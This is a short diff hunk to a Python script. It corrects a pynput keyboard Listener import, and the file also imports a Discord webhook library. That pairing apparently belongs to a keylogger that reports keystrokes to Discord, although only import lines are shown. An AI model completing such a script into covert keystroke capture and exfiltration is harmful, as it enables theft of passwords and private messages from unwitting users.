@@ -1,4 +1,4 @@
-from pynput import Key, Listener
+from pynput.keyboard import Key, Listener
 from discord_webhook import DiscordWebhook
 import time
 import threading
